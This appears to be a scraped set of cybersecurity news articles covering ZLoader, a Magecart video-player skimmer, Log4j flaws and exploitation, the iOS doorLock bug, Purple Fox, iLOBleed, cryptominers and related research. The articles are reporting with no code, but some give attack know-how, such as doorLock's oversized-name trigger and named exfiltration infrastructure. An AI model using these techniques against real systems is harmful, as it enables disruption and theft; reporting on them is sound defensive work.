'text': 'An ongoing ZLoader malware campaign has been uncovered exploiting remote monitoring tools and a nine-year-old flaw concerning Microsoft’s digital signature verification to siphon user credentials and sensitive information.\nIsraeli cybersecurity company Check Point Research, which has been tracking the sophisticated infection chain since November 2021, attributed it to a cybercriminal group dubbed MalSmoke, citing similarities with previous attacks.\n“The techniques incorporated in the infection chain include the use of legitimate remote management software (RMM) to gain initial access to the target machine,“ Check Point’s Golan Cohen said in a report shared with The Hacker News. “The malware then exploits Microsoft’s digital signature verification method to inject its payload into a signed system DLL to further evade the system’s defenses.“\n\nA banking trojan at its core, ZLoader has been employed by many an attacker to steal cookies, passwords, and other private information from victims’ machines, not to mention gaining notoriety for acting as a distribution framework for Conti ransomware, according to an advisory published by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) in September 2021.\nThe campaign is said to have claimed 2,170 victims across 111 countries as of January 2, 2022, with most of the affected parties located in the U.S., Canada, India, Indonesia, and Australia. It’s also notable for the fact that it wraps itself in layers of obfuscation and other detection-evasion methods to elude discovery and analysis.\nThe attack flow commences with tricking users into installing a legitimate enterprise remote monitoring software called Atera, using it to upload and download arbitrary files as well as execute malicious scripts. However, the exact mode of distributing the installer file remains unknown as yet.\n\nOne of the files is used to add exclusions to Windows Defender, while a second file proceeds to retrieve and execute next-stage payloads, including a DLL file called “appContast.dll“ that, in turn, is used to run the ZLoader binary (“9092.dll“).\n\nWhat stands out here is that appContast.dll is not only signed by Microsoft with a valid signature, but also that the file, originally an app resolver module (“AppResolver.dll“), has been tweaked and injected with a malicious script to load the final-stage malware.\nThis is made possible by exploiting a known issue tracked as CVE-2013-3900 — a WinVerifyTrust signature validation vulnerability — that allows remote attackers to execute arbitrary code via specially crafted portable executables by making subtle enough changes to the file without revoking the validity of the digital signature.\n\nAlthough Microsoft addressed the bug in 2013, the company revised its plans in July 2014 to no longer “enforce the stricter verification behavior as a default functionality on supported releases of Microsoft Windows“ and made it available as an opt-in feature. “In other words, this fix is disabled by default, which is what enables the malware author to modify the signed file,“ Cohen said.\n“It seems like the ZLoader campaign authors put great effort into defense evasion and are still updating their methods on a weekly basis,“ Check Point malware researcher, Kobi Eisenkraft, said, urging users to refrain from installing software from unknown sources and apply Microsoft’s strict Windows Authenticode signature verification for executable files.\n\n\nFound this article interesting?

'text': 'Threat actors leveraged a cloud video hosting service to carry out a supply chain attack on more than 100 real estate websites operated by Sotheby’s Realty that involved injecting malicious skimmers to steal sensitive personal information.\n“The attacker injected the skimmer JavaScript codes into video, so whenever others import the video, their websites get embedded with skimmer codes as well,“ Palo Alto Networks’ Unit 42 researchers said in a report published this week.\n\nThe skimmer attacks, also called formjacking, relates to a type of cyber attack wherein bad actors insert malicious JavaScript code into the target website, most often to checkout or payment pages on shopping and e-commerce portals, to harvest valuable information such as credit card details entered by users.\n\nIn the latest incarnation of the Magecart attacks, the operators behind the campaign breached the Brightcove account of Sotheby’s and deployed malicious code into the player of the cloud video platform by tampering with a script that can be uploaded to add JavaScript customizations to the video player.\n“The attacker altered the static script at its hosted location by attaching skimmer code. Upon the next player update, the video platform re-ingested the compromised file and served it along with the impacted player,“ the researchers said, adding it worked with the video service and the real estate company to help remove the malware.\n\nThe campaign is said to have begun as early as January 2021, according to MalwareBytes, with the harvested information — names, emails, phone numbers, credit card data — exfiltrated to a remote server “cdn-imgcloud[.]com“ that also functioned as a collection domain for a Magecart attack targeting Amazon CloudFront CDN in June 2019.\n\n“A Brightcove customer experienced a security issue that originated with videos stored by the customer on a third-party solution, and at no point were other customers, or their end-users, at risk due to this incident,“ the company said in a statement shared with The Hacker News.\nTo detect and prevent injection of malicious code into online sites, it’s recommended to conduct web content integrity checks on a periodic basis, not to mention safeguard accounts from takeover attempts and watch out for potential social engineering schemes.\n“The skimmer itself is highly polymorphic, elusive and continuously evolving,“ the researchers said. “When combined with cloud distribution platforms, the impact of a skimmer of this type could be very large.“\n\n\nFound this article interesting?

'text': 'A group of academics from the University of California, Santa Barbara, has demonstrated what it calls a “scalable technique“ to vet smart contracts and mitigate state-inconsistency bugs, discovering 47 zero-day vulnerabilities on the Ethereum blockchain in the process.\nSmart contracts are programs stored on the blockchain that are automatically executed when predetermined conditions are met based on the encoded terms of the agreement. They allow trusted transactions and agreements to be carried out between anonymous parties without the need for a central authority.\nIn other words, the code itself is meant to be the final arbiter of “the deal“ it represents, with the program controlling all aspects of the execution, and providing an immutable evidentiary audit trail of transactions that are both trackable and irreversible.\n\nThis also means that vulnerabilities in the code could result in hefty losses, as evidenced by hacks aimed at the DAO and more recently, MonoX, where adversaries exploited loopholes to illicitly siphon funds, a scenario that could have catastrophic consequences given the burgeoning adoption of smart contracts over the past few years.\n“Since smart contracts are not easily upgradable, auditing the contract’s source pre-deployment, and deploying a bug-free contract is even more important than in the case of traditional software,“ the researchers detailed in a paper.\n\nEnter Sailfish, which aims to catch state inconsistency vulnerabilities in smart contracts that allow an attacker to tamper with the execution order of the transactions or take over the control flow within a single transaction (i.e., reentrancy).\nThe tool works as follows. Given a smart contract, Sailfish converts the contract into a dependency graph, which captures the control and data flow relations between the storage variables and the state-changing instructions of a smart contract, using it identify potential flaws by defining hazardous access, which are implemented as graph queries to determine whether two different execution paths, at least one being a write operation, operate on the same storage variable.\n\nThe researchers evaluated Sailfish on 89,853 contracts obtained from Etherscan, identifying 47 zero-day flaws that could be leveraged to drain Ether and even corrupt application-specific metadata. This also includes a vulnerable contract implementing a housing tracker that could be abused in a manner such that a house owner can have more than one active listing.\nThe findings of the study will be shared at the IEEE Symposium on Security and Privacy (S&P) to be held in May 2022.\nThis is not the first time problematic smart contracts have attracted attention from academia. In September 2020, Chinese researchers designed a framework for categorizing known weaknesses in smart contracts with the goal of providing a detection criterion for each of the bugs.\n\n\nFound this article interesting?

'text': 'A persistent denial-of-service (DoS) vulnerability has been discovered in Apple’s iOS mobile operating system that’s capable of sending affected devices into a crash or reboot loop upon connecting to an Apple Home-compatible appliance.\nThe behavior, dubbed “doorLock,“ is trivial in that it can be triggered by simply changing the name of a HomeKit device to a string larger than 500,000 characters.\nThis causes an iPhone or iPad that attempts to connect to the device to become unresponsive and enter an indefinite cycle of system failure and restart that can only be mitigated by restoring the affected device from Recovery or DFU (Device Firmware Update) Mode.\n\nHomeKit is Apple’s software framework that allows iOS and iPadOS users to configure, communicate with, and control connected accessories and smart-home appliances using Apple devices.\n“Any device with an affected iOS version installed that loads the string will be disrupted, even after rebooting,“ security researcher Trevor Spiniolas said. “Restoring a device and signing back into the iCloud account linked to the HomeKit device will again trigger the bug.“\n\nThe flaw impacts the latest version of iOS, 15.2, and goes back at least as far as version 14.7, with the weakness likely present on all versions of iOS 14 from 14.0. Apple, for its part, was made aware of the bug on August 10, 2021, with the company aiming to resolve the flaw in early 2022.\nWhile iPhone maker has attempted to mitigate the issue by introducing a local size limit on the renaming of HomeKit devices, Spiniolas noted that the core issue of how iOS handles HomeKit device names remains unresolved.\n\nIn a real-world attack scenario, doorLock could be exploited by an attacker by sending a malicious invite to connect to a HomeKit device with an abnormally large string as its name, effectively locking users out of their local data and preventing them from logging back into iCloud on iOS.\n\nTo make matters worse, since HomeKit device names are also stored on iCloud, signing in to the same iCloud account with a restored device will set off the crash once again, unless the device owner opts to switch off the option to sync HomeKit data.\n“This bug poses a significant risk to the data of iOS users, but the public can protect themselves from the worst of its effects by disabling Home devices in [the] control center in order to protect local data,“ Spiniolas said. “I believe this issue makes ransomware viable for iOS, which is incredibly significant.“\n\n\nFound this article interesting?

'text': 'Trojanized installers of the Telegram messaging application are being used to distribute the Windows-based Purple Fox backdoor on compromised systems.\nThat’s according to new research published by Minerva Labs, describing the attack as different from intrusions that typically take advantage of legitimate software for dropping malicious payloads.\n“This threat actor was able to leave most parts of the attack under the radar by separating the attack into several small files, most of which had very low detection rates by [antivirus] engines, with the final stage leading to Purple Fox rootkit infection,“ researcher Natalie Zargarov said.\nFirst discovered in 2018, Purple Fox comes with rootkit capabilities that allow the malware to be planted beyond the reach of security solutions and evade detection. A March 2021 report from Guardicore detailed its worm-like propagation feature, enabling the backdoor to spread more rapidly.\n\nThen in October 2021, Trend Micro researchers uncovered a .NET implant dubbed FoxSocket deployed in conjunction with Purple Fox that takes advantage of WebSockets to contact its command-and-control (C2) servers for a more secure means of establishing communications.\n“The rootkit capabilities of Purple Fox make it more capable of carrying out its objectives in a stealthier manner,“ the researchers noted. “They allow Purple Fox to persist on affected systems as well as deliver further payloads to affected systems.“\n\nLast but not least, in December 2021, Trend Micro also shed light on the later stages of the Purple Fox infection chain, which involves targeting SQL databases by inserting a malicious SQL common language runtime (CLR) module to achieve a persistent and stealthier execution and ultimately abuse the SQL servers for illicit cryptocurrency mining.\n\nThe new attack chain observed by Minerva commences with a Telegram installer file, an AutoIt script that drops a legitimate installer for the chat app and a malicious downloader called “TextInputh.exe,“ the latter of which is executed to retrieve next-stage malware from the C2 server.\nSubsequently, the downloaded files proceed to block processes associated with different antivirus engines, before advancing to the final stage that results in the download and execution of the Purple Fox rootkit from a now-shut down remote server.\n“We found a large number of malicious installers delivering the same Purple Fox rootkit version using the same attack chain,“ Zargarov said. “It seems like some were delivered via email, while others we assume were downloaded from phishing websites. The beauty of this attack is that every stage is separated to a different file which are useless without the entire file set.“\n\n\nFound this article interesting?

{'title': 'Detecting Evasive Malware on IoT Devices Using Electromagnetic Emanations',
'text': 'Cybersecurity researchers have proposed a novel approach that harnesses electromagnetic field emanations from the Internet of Things (IoT) devices as a side-channel to glean precise knowledge about the different kinds of malware targeting the embedded systems, even in scenarios where obfuscation techniques have been applied to hinder analysis.\nWith the rapid adoption of IoT appliances presenting an attractive attack surface for threat actors, in part due to them being equipped with higher processing power and capable of running fully functional operating systems, the latest research aims to improve malware analysis to mitigate potential security risks.\nThe findings were presented by a group of academics from the Research Institute of Computer Science and Random Systems (IRISA) at the Annual Computer Security Applications Conference (ACSAC) held last month.\n\n“[Electromagnetic] emanation that is measured from the device is practically undetectable by the malware,“ the researchers, Duy-Phuc Pham, Damien Marion, Matthieu Mastio and Annelie Heuser, said in a paper. “Therefore, malware evasion techniques cannot be straightforwardly applied unlike for dynamic software monitoring. Also, since a malware does not have control on outside hardware-level, a protection system relying on hardware features cannot be taken down, even if the malware owns the maximum privilege on the machine.“\nThe goal is to take advantage of the side channel information to detect anomalies in emanations when they deviate from previously observed patterns and raise an alert when suspicious behavior emulating the malware is recorded in comparison to the system’s normal state.\nNot only does this require no modifications on the target devices, the framework devised in the study enables the detection and classification of stealthy malware such as kernel-level rootkits, ransomware, and distributed denial-of-service (DDoS) botnets like Mirai, counting unseen variants.\n\nTaking place over three phases, the side channel approach involves measuring electromagnetic emanations when executing 30 different malware binaries as well as performing benign video, music, picture, and camera-related activities to train a convolutional neural network (CNN) model for classifying real-world malware samples. Specifically, the framework takes as input an executable and outputs its malware label by solely relying on the side-channel information.\n\nIn an experimental setup, the researchers opted for a Raspberry Pi 2B as a target device with 900 MHz quad-core ARM Cortex A7 processor and 1 GB memory, with the electromagnetic signals acquired and amplified using a combination of an oscilloscope and a PA 303 BNC preamplifier, effectively predicting the three malware types and their associated families with an accuracy of 99.82% and 99.61% respectively.\n“[B]y using simple neural network models, it is possible to gain considerable information about the state of a monitored device, by observing solely its [electromagnetic] emanations,“ the researchers concluded. “Our system is robust against various code transformation/obfuscation, including random junk insertion, packing, and virtualization, even when the transformation is previously not known to the system.“\n\n\nFound this article interesting?

{'title': 'Are Medical Devices at Risk of Ransomware Attacks?',
'text': 'In May 2017, the first documented ransomware assault on networked medical equipment happened. The worldwide ransomware assault WannaCry compromised radiological and other instruments in several hospitals during its height, after a software failure caused by a cyberattack on its third-party vendor’s oncology cloud service, cancer patients having radiation therapy at four healthcare institutions had to reschedule appointments.\nThese examples show how cyberattacks and data breaches may have a significant impact on the healthcare industry, heavily reliant on connected medical equipment. PHI (patient health information) captured and stored in these connected medical devices must be secured. Because PHI is transferred over the cloud via server-based systems, making it very susceptible to hackers.\nRansomware attacks on health care professionals have become more common, sophisticated, and severe in recent years. Individual bad actors have been supplanted as the main perpetrators by organized criminal gangs, nation-states and military groups. Despite great effort, law enforcement and government have been unable to stop the escalating wave of attacks on hospital devices and other key infrastructure. Medical device security will be a key part of hospital cybersecurity as ransomware attacks on healthcare organizations increase. \nMedical Devices have Grown In Scale\nThe safety of external medical equipment, whether fixed, implanted, or wearable, is critical to patients’ lives and well-being. Life-saving medical devices include insulin pumps, heart defibrillators, artificial cardiac pacemakers, and ventilators, to name a few. Examples include artificial joints, MRI and CT scanners, infusion pumps, clinic programming, and home monitoring. \nIn a hospital or healthcare institution, security cameras, RFID readers, point-of-sale systems, and guest access cards should all be safeguarded from cyber attacks and security breaches. Medical equipment frequently includes computer systems and networks.\nIn today’s world, medical equipment is linked to all other connected devices in a hospital or medical care institution. Built-in sensors in linked medical equipment collect data that may be sent to other devices and the Internet. These gadgets and their data make up the Internet of Medical Things (IoMT), which assists in the diagnosis, monitoring, and delivery of medicine.\nThese ransomware attacks on medical devices demonstrate the impact of cyberattacks and data breaches on the healthcare business, which is highly reliant on linked medical equipment. Patient Health Information recorded and stored in these linked medical devices must be protected. PHI is sent via server-based systems over the cloud, making it highly vulnerable to hackers.\nThe connected medical devices, which significantly improve patient care and provide better patient outcomes, should be maintained and upgraded to ensure patient safety from the design stage to their use in healthcare organizations or at home.\nIoT Ecosystem\nThe IoT ecosystem consists of medical device manufacturers, providers, systems and software providers, system integrators, connectivity providers, and end-users. More collaboration between stakeholders to tackle the cybersecurity vulnerabilities and risks of connected medical devices will help prevent cyber attacks.\nRansomware assaults on healthcare institution networks trigger medical device outages that put patient lives at risk. You can’t have safe and functional medical equipment if it’s unavailable due to ransomware. There has been a significant shift in the Medtech sector over the last decade to identify the rising cyber threat to devices. Nation-states and organized crime syndicates are wreaking havoc on medical equipment, jeopardizing their safety and efficacy for healthcare providers. \nIn a Ponemon Institute poll, a quarter of healthcare delivery businesses indicated they witnessed increased death rates after a ransomware assault. Health systems are at a higher risk of having a negative influence on patient care as linked medical devices become more widely used. The latest issue for healthcare institutions and the MedTech sector is maintaining the availability of medical equipment in the face of escalating cyber threats that threaten patient safety.\nMedical devices need to be designed with security in mind to resist even everyday, run-of-the-mill threats like ransomware. Currently, there is no statutory requirement, premarket or postmarket, that expressly compels device manufacturers to address cybersecurity.\nSecurity measures in the cloud\nIn the event of a data breach, the healthcare institution, not the cloud services provider, is responsible. On the other hand, Cloud providers must follow stringent security guidelines. FDA Cybersecurity Guidelines, cloud security engineering best practices, frequent security audits, disaster recovery scenarios, and action based on a well-defined security and data-protection incident management system are instances of this.\nWith medical devices or associated software, real-time monitoring, cyber threat modeling and analysis, threat mitigation, and remediation should all be achievable. Due to regular recordkeeping and monitoring, every breach is detected as soon as it occurs. Early detection of a breach helps determine the severity of the breach and ensures that it is remedied.\nMedical gadgets, which are frequently obsolete, are not always upgradeable. Assaults on medical equipment with minimal support might cause vital functions to be disrupted, putting lives at danger. Medical device owners should contact the vendor or manufacturer ahead of time if they have any maintenance or update problems with their medical equipment.\nThe FDA has incorporated a requirement in its Medical Device Safety Action Plan that compels medical device manufacturers to embed security updates and patch capabilities into network-connected devices from the outset, in response to the rising danger. \nIt also outlines procedures for disclosing any faults in these devices once being released to the general public. It’s becoming increasingly critical for engineers to consider cybersecurity considerations while assessing the danger of a medical device. Anti-ransomware/cyberattack protection should be included in the device’s specs. If you’re submitting one of these devices to the FDA, expect them to ask many questions about how you’re dealing with cybersecurity issues.\nConclusion\nFrom the design stage to their usage in healthcare organizations or at home, connected medical devices that significantly improve patient care and improve patient outcomes must be properly maintained and upgraded to guarantee patient safety against ransomware outages. \nMedical device makers, suppliers, systems and software providers, system integrators, connection providers, and end-users make up the IoT ecosystem. It will be easier to avoid cyber assaults if all stakeholders work together to address the cybersecurity vulnerabilities and hazards of connected medical equipment.\n\n\nFound this article interesting?

'text': 'Microsoft, over the weekend, rolled out a fix to address an issue that caused email messages to get stuck on its Exchange Server platforms due to what it blamed on a date validation error at around the turn of the year.\n“The problem relates to a date check failure with the change of the new year and it [is] not a failure of the [antivirus] engine itself,“ the company said in a blog post. “This is not an issue with malware scanning or the malware engine, and it is not a security-related issue. The version checking performed against the signature file is causing the malware engine to crash, resulting in messages being stuck in transport queues.“\n\nThe Windows maker said the issue impacted on-premises versions of Exchange Server 2016 and Exchange Server 2019 but didn’t specify how widespread the impact was.\nThe issue began to gain attention as the year 2022 kicked in, causing the servers to no longer deliver email messages while throwing the following error message: “The FIP-FS ’Microsoft’ Scan Engine failed to load. PID: 23092, Error Code: 0x80004005. Error Description: Can’t convert ’2201010001’ to long.“\n\nMicrosoft noted that the issue was caused due to a date issue in a signature file used by the malware scanning engine within Exchange Server.\n\nTo mitigate the Y2K22 problem, Microsoft is recommending customers to download a PowerShell-based scan engine reset script called “Reset-ScanEngineVersion.ps1“ that can then be executed on each Exchange mailbox server used for downloading antimalware updates. It’s worth noting that the update will also change the version of the engine to 2112330001.\n“The newly updated scanning engine is fully supported by Microsoft,“ the company outlined. “While we need to work on this sequence longer term, the scanning engine version was not rolled back, rather it was rolled forward into this new sequence.

{'title': 'New iLOBleed Rootkit Targeting HP Enterprise Servers with Data Wiping Attacks',
'text': 'A previously unknown rootkit has been found setting its sights on Hewlett-Packard Enterprise’s Integrated Lights-Out (iLO) server management technology to carry out in-the-wild attacks that tamper with the firmware modules and completely wipe data off the infected systems.\nThe discovery, which is the first instance of real-world malware in iLO firmware, was documented by Iranian cybersecurity firm Amnpardaz this week.\n“There are numerous aspects of iLO that make it an ideal utopia for malware and APT groups: Extremely high privileges (above any level of access in the operating system), very low-level access to the hardware, being totally out of the sight of the admins, and security tools, the general lack of knowledge and tools for inspecting iLO and/or protecting it, the persistence it provides for the malware to remain even after changing the operating system, and in particular being always running and never shutting down,“ the researchers said.\n\nBesides managing the servers, the fact that iLO modules have broad access to all the firmware, hardware, software, and operating system (OS) installed on the servers make them an ideal candidate to breach organizations using HP servers, while also enabling the malware to maintain persistence after reboots and survive OS reinstallations. However, the exact modus operandi used to infiltrate the network infrastructure and deploy the wiper remains unknown as yet.\n\nDubbed iLOBleed, the rootkit has been put to use in attacks since 2020 with the goal of manipulating a number of original firmware modules in order to stealthily obstruct updates to the firmware. Specifically, the modifications made to the firmware routine simulates the firmware upgrade process — by purportedly displaying the right firmware version and adding relevant logs — when in reality no updates are performed.\n“This alone shows that the purpose of this malware is to be a rootkit with maximum stealth and to hide from all security inspections,“ the researchers said. “A malware that, by hiding in one of the most powerful processing resources (which is always on), is able to execute any commands received from an attacker, without ever being detected.“\n\nAlthough the adversary remains unidentified, Amnpardaz described the rootkit as likely the work of an advanced persistent threat (APT), a designation a nation-state or state-sponsored group that employs continuous, clandestine, and sophisticated hacking techniques to gain unauthorized access to a system and remain inside for a prolonged period of time without attracting attention.\n\nHPE, in a statement shared with The Hacker News said that the vulnerability being exploited is not new and that it was disclosed and patched by the company in 2017. Given that versions iLO 4 and prior are at more risk of being modified and infected by the malware, the enterprise IT firm pointed out that customers who followed the recommended corrective actions or have upgraded to iLO 5 are not susceptible to exploitation.\nIf anything, the development once again brings firmware security into sharp focus, necessitating that firmware updates shipped by the manufacturer are promptly applied to mitigate potential risks, iLO networks are segmented from the operating networks, and that the firmware is periodically monitored for signs of infection.\n“Another important point is that there are methods to access and infect iLO both through the network and through the host operating system,“ the researchers noted. “This means that even if the iLO network cable is completely disconnected, there is still the possibility of infection with the malware. Interestingly, there is no way to turn off or disable iLO completely in case it is not needed.“\n\n\nFound this article interesting?

'text': 'A never-before-seen China-based targeted intrusion adversary dubbed Aquatic Panda has been observed leveraging critical flaws in the Apache Log4j logging library as an access vector to perform various post-exploitation operations, including reconnaissance and credential harvesting on targeted systems.\nCybersecurity firm CrowdStrike said the infiltration, which was ultimately foiled, was aimed at an unnamed “large academic institution.“ The state-sponsored group is believed to have been operating since mid-2020 in pursuit of intelligence collection and industrial espionage, with its attacks primarily directed against companies in the telecommunications, technology, and government sectors.\n\nThe attempted intrusion exploited the newly discovered Log4Shell flaw (CVE-2021-44228, CVSS score: 10.0) to gain access to a vulnerable instance of the VMware Horizon desktop and app virtualization product, followed by running a series of malicious commands orchestrated to fetch threat actor payloads hosted on a remote server.\n\n“A modified version of the Log4j exploit was likely used during the course of the threat actor’s operations,“ the researchers noted, adding it involved the use of an exploit that was published in GitHub on December 13, 2021.\nAquatic Panda’s malicious behavior went beyond conducting reconnaissance of the compromised host, starting with making an effort to stop a third-party endpoint detection and response (EDR) service, before proceeding to retrieve next-stage payloads designed to obtain a reverse shell and harvest credentials.\n\nBut after the victim organization was alerted to the incident, the entity “was able to quickly implement their incident response protocol, eventually patching the vulnerable application and preventing further threat actor activity on the host.“ In light of the attack’s successful disruption, the exact intent remains unknown.\n\n\nFound this article interesting?

{'title': 'Ongoing Autom Cryptomining Malware Attacks Using Upgraded Evasion Tactics',
'text': 'An ongoing crypto mining campaign has upgraded its arsenal while evolving its defense evasion tactics that enable the threat actors to conceal the intrusions and fly under the radar, new research published today has revealed.\nSince first detected in 2019, a total of 84 attacks against its honeypot servers have been recorded to date, four of which transpired in 2021, according to researchers from DevSecOps and cloud security firm Aqua Security, who have been tracking the malware operation for the past three years. That said, 125 attacks have been spotted in the wild in the third quarter of 2021 alone, signaling that the attacks have not slowed down.\nInitial attacks involved executing a malicious command upon running a vanilla image named “alpine:latest“ that resulted in the download of a shell script named “autom.sh.“\n“Adversaries commonly use vanilla images along with malicious commands to perform their attacks, because most organizations trust the official images and allow their use,“ the researchers said in a report shared with The Hacker News. “Over the years, the malicious command that was added to the official image to carry out the attack has barely changed. The main difference is the server from which the shell script autom.sh was downloaded.“\n\nThe shell script initiates the attack sequence, enabling the adversary to create a new user account under the name “akay“ and upgrade its privileges to a root user, using which arbitrary commands are run on the compromised machine with the goal of mining cryptocurrency.\nAlthough early phases of the campaign in 2019 featured no special techniques to hide the mining activity, later versions show the extreme measures its developers have taken to keep it invisible to detection and inspection, chief among them being the ability to disable security mechanisms and retrieve an obfuscated mining shell script that was Base64-encoded five times to get around security tools.\n\nMalware campaigns carried out to hijack computers to mine cryptocurrencies have been dominated by multiple threat actors such as Kinsing, which has been found scanning the internet for misconfigured Docker servers to break into the unprotected hosts and install a previously undocumented coin miner strain.\n\nOn top of that, a hacking group named TeamTNT has been observed striking unsecured Redis database servers, Alibaba Elastic Computing Service (ECS) instances, exposed Docker APIs, and vulnerable Kubernetes clusters in order to execute malicious code with root privileges on the targeted hosts as well as deploy cryptocurrency-mining payloads and credential stealers. In addition, compromised Docker Hub accounts have also been employed to host malicious images that were then used to distribute cryptocurrency miners.\n\n“Miners are a low-risk way for cybercriminals to turn a vulnerability into digital cash, with the greatest risk to their cash flow being competing miners discovering the same vulnerable servers,“ Sophos senior threat researcher Sean Gallagher noted in an analysis of a Tor2Mine mining campaign, which involves the use of a PowerShell script to disable malware protection, execute a miner payload, and harvest Windows credentials.\nIn recent weeks, security flaws in the Log4j logging library as well as vulnerabilities newly uncovered in Atlassian Confluence, F5 BIG-IP, VMware vCenter, and Oracle WebLogic Servers have been abused to take over machines to mine cryptocurrencies, a scheme known as cryptojacking. Earlier this month, network-attached storage (NAS) appliance maker QNAP also warned of cryptocurrency mining malware targeting its devices that could occupy around 50% of the total CPU usage.\n“The Autom campaign illustrates that attackers are becoming more sophisticated, continually improving their techniques and their ability to avoid detection by security solutions,“ the researchers said. To protect against these threats, it’s recommended to monitor suspicious container activity, perform dynamic image analysis, and routinely scan the environments for misconfiguration issues.\n\n\nFound this article interesting?

{'title': 'New Apache Log4j Update Released to Patch Newly Discovered Vulnerability',
'text': 'The Apache Software Foundation (ASF) on Tuesday rolled out fresh patches to contain an arbitrary code execution flaw in Log4j that could be abused by threat actors to run malicious code on affected systems, making it the fifth security shortcoming to be discovered in the tool in the span of a month.\nTracked as CVE-2021-44832, the vulnerability is rated 6.6 in severity on a scale of 10 and impacts all versions of the logging library from 2.0-alpha7 to 2.17.0 with the exception of 2.3.2 and 2.12.4. While Log4j versions 1.x are not affected, users are recommended to upgrade to Log4j 2.3.2 (for Java 6), 2.12.4 (for Java 7), or 2.17.1 (for Java 8 and later).\n“Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code execution (RCE) attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code,“ the ASF said in an advisory. “This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.“\nAlthough no credits were awarded by the ASF for the issue, Checkmarx security researcher Yaniv Nizry claimed credit for reporting the vulnerability to Apache on December 27.\n\n“The complexity of this vulnerability is higher than the original CVE-2021-44228 since it requires the attacker to have control over the configuration,“ Nizry noted. “Unlike Logback, in Log4j there is a feature to load a remote configuration file or to configure the logger through the code, so an arbitrary code execution could be achieved with [an] MitM attack, user input ending up in a vulnerable configuration variable, or modifying the config file.“\nWith the latest fix, the project maintainers have addressed a total of four issues in Log4j since the Log4Shell flaw came to light earlier this month, not to mention a fifth vulnerability affecting versions Log4j 1.2 that will not be fixed —\nCVE-2021-44228 (CVSS score: 10.0) - A remote code execution vulnerability affecting Log4j versions from 2.0-beta9 to 2.14.1 (Fixed in version 2.15.0)CVE-2021-45046 (CVSS score: 9.0) - An information leak and remote code execution vulnerability affecting Log4j versions from 2.0-beta9 to 2.15.0, excluding 2.12.2 (Fixed in version 2.16.0)CVE-2021-45105 (CVSS score: 7.5) - A denial-of-service vulnerability affecting Log4j versions from 2.0-beta9 to 2.16.0 (Fixed in version 2.17.0)CVE-2021-4104 (CVSS score: 8.1) - An untrusted deserialization flaw affecting Log4j version 1.2 (No fix available; Upgrade to version 2.17.1)\nThe development also comes as intelligence agencies from across Australia, Canada, New Zealand, the U.K., and the U.S. issued a joint advisory warning of mass exploitation of multiple vulnerabilities in Apache’s Log4j software library by nefarious adversaries.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have offered a detailed glimpse into a system called DoubleFeature that’s dedicated to logging the different stages of post-exploitation stemming from the deployment of DanderSpritz, a full-featured malware framework used by the Equation Group.\nDanderSpritz came to light on April 14, 2017, when a hacking group known as the Shadow Brokers leaked the exploit tool, among others, under a dispatch titled “Lost in Translation.“ Also included in the leaks was EternalBlue, a cyberattack exploit developed by the U.S. National Security Agency (NSA) that enabled threat actors to carry out the NotPetya ransomware attack on unpatched Windows computers.\n\nThe tool is a modular, stealthy, and fully functional framework that relies on dozens of plugins for post-exploitation activities on Windows and Linux hosts. DoubleFeature is one among them, which functions as a “diagnostic tool for victim machines carrying DanderSpritz,“ researchers from Check Point said in a new report published Monday.\n\n“DoubleFeature could be used as a sort of Rosetta Stone for better understanding DanderSpritz modules, and systems compromised by them,“ the Israeli cybersecurity firm added. “It’s an incident response team’s pipe dream.“\nDesigned to maintain a log of the types of tools that could be deployed on a target machine, DoubleFeature is a Python-based dashboard that also doubles up as a reporting utility to exfiltrate the logging information from the infected machine to an attacker-controlled server. The output is interpreted using a specialized executable named “DoubleFeatureReader.exe.“\n\nSome of the plugins monitored by DoubleFeature include remote access tools called UnitedRake (aka EquationDrug) and PeddleCheap, a stealthy data exfiltration backdoor dubbed StraitBizarre, an espionage platform called KillSuit (aka GrayFish), a persistence toolset named DiveBar, a covert network access driver called FlewAvenue, and a validator implant named MistyVeal that verifies if the compromised system is indeed an authentic victim machine and not a research environment.\n“Sometimes, the world of high-tier APT tools and the world of ordinary malware can seem like two parallel universes,“ the researchers said. “Nation-state actors tend to [maintain] clandestine, gigantic codebases, sporting a huge gamut of features that have been cultivated over decades due to practical need. It turns out we too are still slowly chewing on the 4-year-old leak that revealed DanderSpritz to us, and gaining new insights.“\n\n\nFound this article interesting?

{'title': '’Spider-Man: No Way Home’ Pirated Downloads Contain Crypto-Mining Malware',
'text': 'Peter Parker might not be a mastermind cryptocurrency criminal, but the name Spiderman is quickly becoming more associated with the mining landscape. ReasonLabs, a leading provider of cybersecurity prevention and detection software, recently discovered a new form of malware hacking into customer computers in the guise of the latest Spiderman movie. \nAs perhaps the most talked-about movie for some time, Spiderman: No Way Home represents an excellent opportunity for hackers. It’s a chance to connect with millions of potential targets, and hack into computers all around the globe. All today’s malicious actors need to do is promise their victims access to the latest movie, and they get an all-access pass to their PC. \nThe cryptocurrency mining malware discovered by ReasonLabs disguises itself as a torrent for the Spiderman: No Way Home movie, encouraging viewers around the world to download the file, and open the computer to criminals. \nUsing a Mask: Tricking Users into Downloading Malware\nCybersecurity issues are on the rise in today’s digital world. There were around 714 million attempted ransomware attacks reported for 2021 – a 134% rise from 2020. As people spend more of their time online, both for work and entertainment, criminals are discovering new opportunities to pinpoint easy targets. One of the easiest ways for criminals to find their victims – is with the right lure. \n\nWith many viewers still unable to attend physical cinemas due to lockdown restrictions, fans of the Spiderman franchise have been keen to get their hands on the movie elsewhere. This might be why so many people chose to download the “leaked“ file, identified as: spiderman_net_putidomoi.torrent.exe, when it first emerged. \nAccording to ReasonLabs, however, this is far from the first-time criminals have tried to trick users by convincing them they’re downloading something they want. \nWhile most people are aware of the threats associated with unknown files, criminals are excellent at making their downloads look legitimate. This specific cryptocurrency mining malware may have been around in a number of different disguises before donning the Spiderman outfit. ReasonLabs believes it has also been circulating as apps like Discord or Windows Updater. \nWhat Does the Spiderman Malware Do?\nThe malware baked into the Spiderman: No Way Home torrent is not listed by VirusTotal at this time, but ReasonLabs believes it has been around for quite some time, affecting numerous users. \nReasonLabs noted they frequently see miners deploying in the disguise of common programs and files. Crypto-mining tools hidden in the files has grown increasingly popular in recent years, because they offer easy access to cash. Hiding a crypto miner in a file sure to attract a lot of attention, like a Spiderman movie, makes it easy to target as many victims as possible. 